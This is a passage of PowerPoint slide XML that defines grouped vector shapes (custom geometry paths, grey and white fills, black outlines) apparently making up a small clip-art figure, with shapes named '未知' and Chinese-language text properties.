                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 77"/>
                  <a:gd name="T16" fmla="*/ 0 h 59"/>
                  <a:gd name="T17" fmla="*/ 77 w 77"/>
                  <a:gd name="T18" fmla="*/ 59 h 59"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="77" h="59">
                    <a:moveTo>
                      <a:pt x="0" y="59"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="35" y="42"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="77" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="59"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="C0C0C0"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="97" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="246" y="180"/>
                <a:ext cx="50" cy="39"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 76"/>
                  <a:gd name="T1" fmla="*/ 1 h 59"/>
                  <a:gd name="T2" fmla="*/ 1 w 76"/>
                  <a:gd name="T3" fmla="*/ 0 h 59"/>
                  <a:gd name="T4" fmla="*/ 0 w 76"/>
                  <a:gd name="T5" fmla="*/ 1 h 59"/>
                  <a:gd name="T6" fmla="*/ 1 w 76"/>
                  <a:gd name="T7" fmla="*/ 1 h 59"/>
                  <a:gd name="T8" fmla="*/ 1 w 76"/>
                  <a:gd name="T9" fmla="*/ 1 h 59"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 76"/>
                  <a:gd name="T16" fmla="*/ 0 h 59"/>
                  <a:gd name="T17" fmla="*/ 76 w 76"/>
                  <a:gd name="T18" fmla="*/ 59 h 59"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="76" h="59">
                    <a:moveTo>
                      <a:pt x="76" y="11"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="51" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="47"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="24" y="59"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="76" y="11"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="C0C0C0"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="296" y="187"/>
                <a:ext cx="68" cy="32"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 102"/>
                  <a:gd name="T1" fmla="*/ 0 h 48"/>
                  <a:gd name="T2" fmla="*/ 1 w 102"/>
                  <a:gd name="T3" fmla="*/ 1 h 48"/>
                  <a:gd name="T4" fmla="*/ 1 w 102"/>
                  <a:gd name="T5" fmla="*/ 0 h 48"/>
                  <a:gd name="T6" fmla="*/ 0 w 102"/>
                  <a:gd name="T7" fmla="*/ 0 h 48"/>
                  <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T9" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 w 102"/>
                  <a:gd name="T13" fmla="*/ 0 h 48"/>
                  <a:gd name="T14" fmla="*/ 102 w 102"/>
                  <a:gd name="T15" fmla="*/ 48 h 48"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T8">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T9">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T10">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T12" t="T13" r="T14" b="T15"/>
                <a:pathLst>
                  <a:path w="102" h="48">
                    <a:moveTo>
                      <a:pt x="0" y="0"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="52" y="48"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="0"/>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未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="255" y="203"/>
                <a:ext cx="76" cy="16"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 115"/>
                  <a:gd name="T1" fmla="*/ 1 h 23"/>
                  <a:gd name="T2" fmla="*/ 0 w 115"/>
                  <a:gd name="T3" fmla="*/ 0 h 23"/>
                  <a:gd name="T4" fmla="*/ 1 w 115"/>
                  <a:gd name="T5" fmla="*/ 0 h 23"/>
                  <a:gd name="T6" fmla="*/ 1 w 115"/>
                  <a:gd name="T7" fmla="*/ 1 h 23"/>
                  <a:gd name="T8" fmla="*/ 1 w 115"/>
                  <a:gd name="T9" fmla="*/ 1 h 23"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 115"/>
                  <a:gd name="T16" fmla="*/ 0 h 23"/>
                  <a:gd name="T17" fmla="*/ 115 w 115"/>
                  <a:gd name="T18" fmla="*/ 23 h 23"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="115" h="23">
                    <a:moveTo>
                      <a:pt x="11" y="23"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="98" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="23"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="11" y="23"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="808080"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="100" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="296" y="172"/>
                <a:ext cx="77" cy="15"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 116"/>
                  <a:gd name="T1" fmla="*/ 1 h 22"/>
                  <a:gd name="T2" fmla="*/ 1 w 116"/>
                  <a:gd name="T3" fmla="*/ 0 h 22"/>
                  <a:gd name="T4" fmla="*/ 1 w 116"/>
                  <a:gd name="T5" fmla="*/ 0 h 22"/>
                  <a:gd name="T6" fmla="*/ 0 w 116"/>
                  <a:gd name="T7" fmla="*/ 1 h 22"/>
                  <a:gd name="T8" fmla="*/ 1 w 116"/>
                  <a:gd name="T9" fmla="*/ 1 h 22"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 116"/>
                  <a:gd name="T16" fmla="*/ 0 h 22"/>
                  <a:gd name="T17" fmla="*/ 116 w 116"/>
                  <a:gd name="T18" fmla="*/ 22 h 22"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="116" h="22">
                    <a:moveTo>
                      <a:pt x="102" y="22"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="116" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="14" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="22"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="22"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="C0C0C0"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="101" name="Group 79"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="0" y="0"/>
                <a:ext cx="245" cy="281"/>
                <a:chOff x="0" y="0"/>
                <a:chExt cx="245" cy="281"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="102" name="未知"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="208" y="93"/>
                  <a:ext cx="37" cy="24"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 1 w 56"/>
                    <a:gd name="T1" fmla="*/ 1 h 36"/>
                    <a:gd name="T2" fmla="*/ 1 w 56"/>
                    <a:gd name="T3" fmla="*/ 1 h 36"/>
                    <a:gd name="T4" fmla="*/ 1 w 56"/>
                    <a:gd name="T5" fmla="*/ 0 h 36"/>
                    <a:gd name="T6" fmla="*/ 1 w 56"/>
                    <a:gd name="T7" fmla="*/ 1 h 36"/>
                    <a:gd name="T8" fmla="*/ 1 w 56"/>
                    <a:gd name="T9" fmla="*/ 1 h 36"/>
                    <a:gd name="T10" fmla="*/ 1 w 56"/>
                    <a:gd name="T11" fmla="*/ 1 h 36"/>
                    <a:gd name="T12" fmla="*/ 1 w 56"/>
                    <a:gd name="T13" fmla="*/ 1 h 36"/>
                    <a:gd name="T14" fmla="*/ 1 w 56"/>
                    <a:gd name="T15" fmla="*/ 1 h 36"/>
                    <a:gd name="T16" fmla="*/ 1 w 56"/>
                    <a:gd name="T17" fmla="*/ 1 h 36"/>
                    <a:gd name="T18" fmla="*/ 1 w 56"/>
                    <a:gd name="T19" fmla="*/ 1 h 36"/>
                    <a:gd name="T20" fmla="*/ 1 w 56"/>
                    <a:gd name="T21" fmla="*/ 1 h 36"/>
                    <a:gd name="T22" fmla="*/ 0 w 56"/>
                    <a:gd name="T23" fmla="*/ 1 h 36"/>
                    <a:gd name="T24" fmla="*/ 1 w 56"/>
                    <a:gd name="T25" fmla="*/ 1 h 36"/>
                    <a:gd name="T26" fmla="*/ 1 w 56"/>
                    <a:gd name="T27" fmla="*/ 1 h 36"/>
                    <a:gd name="T28" fmla="*/ 1 w 56"/>
                    <a:gd name="T29" fmla="*/ 1 h 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
                    <a:gd name="T46" fmla="*/ 0 h 36"/>
                    <a:gd name="T47" fmla="*/ 56 w 56"/>
                    <a:gd name="T48" fmla="*/ 36 h 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 h="36">
                      <a:moveTo>
                        <a:pt x="21" y="7"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="34" y="1"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="46" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="54" y="1"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="56" y="5"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="54" y="13"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="46" y="20"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="34" y="28"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="23" y="34"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="11" y="36"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="4" y="36"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="0" y="30"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="4" y="22"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="11" y="15"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="21" y="7"/>
                      </a:lnTo>
                      <a:close/>
                    </a:path>
                  </a:pathLst>
                </a:custGeom>
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:ln w="9525">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:round/>
                  <a:headEnd/>
                  <a:tailEnd/>
                </a:ln>
              </p:spPr>
              <p:txBody>
                <a:bodyPr/>
                <a:lstStyle/>
                <a:p>
                  <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                </a:p>
              </p:txBody>
            </p:sp>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="103" name="Line 81"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeShapeType="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm flipV="1">
                  <a:off x="191" y="115"/>
                  <a:ext cx="15" cy="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 name="Line 82"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeShapeType="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="182" y="47"/>
                  <a:ext cx="47" cy="54"/>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未知"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="109" y="0"/>
                  <a:ext cx="69" cy="61"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 1 w 104"/>
                    <a:gd name="T1" fmla="*/ 1 h 92"/>
                    <a:gd name="T2" fmla="*/ 1 w 104"/>
                    <a:gd name="T3" fmla="*/ 1 h 92"/>
                    <a:gd name="T4" fmla="*/ 1 w 104"/>
                    <a:gd name="T5" fmla="*/ 1 h 92"/>
                    <a:gd name="T6" fmla="*/ 1 w 104"/>
                    <a:gd name="T7" fmla="*/ 1 h 92"/>
                    <a:gd name="T8" fmla="*/ 1 w 104"/>
                    <a:gd name="T9" fmla="*/ 0 h 92"/>
                    <a:gd name="T10" fmla="*/ 1 w 104"/>
                    <a:gd name="T11" fmla="*/ 0 h 92"/>
                    <a:gd name="T12" fmla="*/ 1 w 104"/>
                    <a:gd name="T13" fmla="*/ 1 h 92"/>
                    <a:gd name="T14" fmla="*/ 1 w 104"/>
                    <a:gd name="T15" fmla="*/ 1 h 92"/>
                    <a:gd name="T16" fmla="*/ 1 w 104"/>
                    <a:gd name="T17" fmla="*/ 1 h 92"/>
                    <a:gd name="T18" fmla="*/ 0 w 104"/>
                    <a:gd name="T19" fmla="*/ 1 h 92"/>
                    <a:gd name="T20" fmla="*/ 1 w 104"/>
                    <a:gd name="T21" fmla="*/ 1 h 92"/>
                    <a:gd name="T22" fmla="*/ 1 w 104"/>
                    <a:gd name="T23" fmla="*/ 1 h 92"/>
                    <a:gd name="T24" fmla="*/ 1 w 104"/>
                    <a:gd name="T25" fmla="*/ 1 h 92"/>
                    <a:gd name="T26" fmla="*/ 1 w 104"/>
                    <a:gd name="T27" fmla="*/ 1 h 92"/>
                    <a:gd name="T28" fmla="*/ 1 w 104"/>
                    <a:gd name="T29" fmla="*/ 1 h 92"/>
                    <a:gd name="T30" fmla="*/ 1 w 104"/>
                    <a:gd name="T31" fmla="*/ 1 h 92"/>
                    <a:gd name="T32" fmla="*/ 1 w 104"/>
                    <a:gd name="T33" fmla="*/ 1 h 92"/>
                    <a:gd name="T34" fmla="*/ 1 w 104"/>
                    <a:gd name="T35" fmla="*/ 1 h 92"/>
                    <a:gd name="T36" fmla="*/ 1 w 104"/>
                    <a:gd name="T37" fmla="*/ 1 h 9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92"/>
                    <a:gd name="T59" fmla="*/ 104 w 104"/>
                    <a:gd name="T60" fmla="*/ 92 h 9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92">
                      <a:moveTo>
                        <a:pt x="104" y="45"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="100" y="30"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="92" y="15"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="79" y="5"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="62" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="42" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="27" y="5"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="12" y="15"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="4" y="30"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="0" y="45"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="4" y="62"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="12" y="75"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="27" y="87"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="42" y="92"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="62" y="92"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="79" y="87"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="92" y="75"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="100" y="62"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="104" y="45"/>
                      </a:lnTo>
                      <a:close/>
                    </a:path>
                  </a:pathLst>
                </a:custGeom>
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:ln w="3175">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:round/>
                  <a:headEnd/>
                  <a:tailEnd/>
                </a:ln>
              </p:spPr>
              <p:txBody>
                <a:bodyPr/>
                <a:lstStyle/>
                <a:p>
                  <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                </a:p>
              </p:txBody>
            </p:sp>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="106" name="未知"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="0" y="144"/>
                  <a:ext cx="68" cy="137"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 1 w 102"/>
                    <a:gd name="T1" fmla="*/ 1 h 206"/>
                    <a:gd name="T2" fmla="*/ 1 w 102"/>
                    <a:gd name="T3" fmla="*/ 1 h 206"/>
                    <a:gd name="T4" fmla="*/ 0 w 102"/>
                    <a:gd name="T5" fmla="*/ 1 h 206"/>
                    <a:gd name="T6" fmla="*/ 1 w 102"/>
                    <a:gd name="T7" fmla="*/ 1 h 206"/>
                    <a:gd name="T8" fmla="*/ 1 w 102"/>
                    <a:gd name="T9" fmla="*/ 0 h 206"/>
                    <a:gd name="T10" fmla="*/ 1 w 102"/>
                    <a:gd name="T11" fmla="*/ 1 h 206"/>
                    <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T18" fmla="*/ 0 w 102"/>
                    <a:gd name="T19" fmla="*/ 0 h 206"/>
                    <a:gd name="T20" fmla="*/ 102 w 102"/>
                    <a:gd name="T21" fmla="*/ 206 h 206"/>
                  </a:gdLst>
                  <a:ahLst/>
                  <a:cxnLst>
                    <a:cxn ang="T12">
                      <a:pos x="T0" y="T1"/>
                    </a:cxn>
                    <a:cxn ang="T13">
                      <a:pos x="T2" y="T3"/>
                    </a:cxn>
                    <a:cxn ang="T14">
                      <a:pos x="T4" y="T5"/>
                    </a:cxn>
                    <a:cxn ang="T15">
                      <a:pos x="T6" y="T7"/>
                    </a:cxn>
                    <a:cxn ang="T16">
                      <a:pos x="T8" y="T9"/>
                    </a:cxn>
                    <a:cxn ang="T17">
                      <a:pos x="T10" y="T11"/>
                    </a:cxn>
                  </a:cxnLst>
                  <a:rect l="T18" t="T19" r="T20" b="T21"/>
                  <a:pathLst>
                    <a:path w="102" h="206">
                      <a:moveTo>
                        <a:pt x="102" y="100"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="50" y="206"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="0" y="206"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="50" y="76"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="50" y="0"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="102" y="100"/>
                      </a:lnTo>
                      <a:close/>
                    </a:path>
                  </a:pathLst>
                </a:custGeom>
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:ln w="3175">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:round/>
                  <a:headEnd/>
                  <a:tailEnd/>
                </a:ln>
              </p:spPr>
              <p:txBody>
                <a:bodyPr/>
                <a:lstStyle/>
                <a:p>
                  <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                </a:p>
              </p:txBody>
            </p:sp>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="107" name="未知"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="33" y="47"/>
                  <a:ext cx="158" cy="234"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 1 w 238"/>
                    <a:gd name="T1" fmla="*/ 0 h 353"/>
                    <a:gd name="T2" fmla="*/ 0 w 238"/>
                    <a:gd name="T3" fmla="*/ 1 h 353"/>
                    <a:gd name="T4" fmla="*/ 1 w 238"/>
                    <a:gd name="T5" fmla="*/ 1 h 353"/>
                    <a:gd name="T6" fmla="*/ 1 w 238"/>
                    <a:gd name="T7" fmla="*/ 1 h 353"/>
                    <a:gd name="T8" fmla="*/ 1 w 238"/>
                    <a:gd name="T9" fmla="*/ 1 h 353"/>
                    <a:gd name="T10" fmla="*/ 1 w 238"/>
                    <a:gd name="T11" fmla="*/ 1 h 353"/>
                    <a:gd name="T12" fmla="*/ 1 w 238"/>
                    <a:gd name="T13" fmla="*/ 1 h 353"/>
                    <a:gd name="T14" fmla="*/ 1 w 238"/>
                    <a:gd name="T15" fmla="*/ 1 h 353"/>
                    <a:gd name="T16" fmla="*/ 1 w 238"/>
                    <a:gd name="T17" fmla="*/ 0 h 3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353"/>
                    <a:gd name="T29" fmla="*/ 238 w 238"/>
                    <a:gd name="T30" fmla="*/ 353 h 3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353">
                      <a:moveTo>
                        <a:pt x="104" y="0"/>
                      </a:moveTo>
                      <a:lnTo>
                        <a:pt x="0" y="147"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="100" y="353"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="163" y="353"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="90" y="164"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="142" y="94"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="219" y="153"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="238" y="117"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="104" y="0"/>
                      </a:lnTo>
                      <a:close/>
                    </a:path>
                  </a:pathLst>
                </a:custGeom>
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:ln w="3175">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:round/>
                  <a:headEnd/>
                  <a:tailEnd/>
                </a:ln>
              </p:spPr>
              <p:txBody>
                <a:bodyPr/>
                <a:lstStyle/>
                <a:p>
                  <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                </a:p>
              </p:txBody>
            </p:sp>
          </p:grpSp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="28" name="Group 86"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="3959930" y="4649391"/>
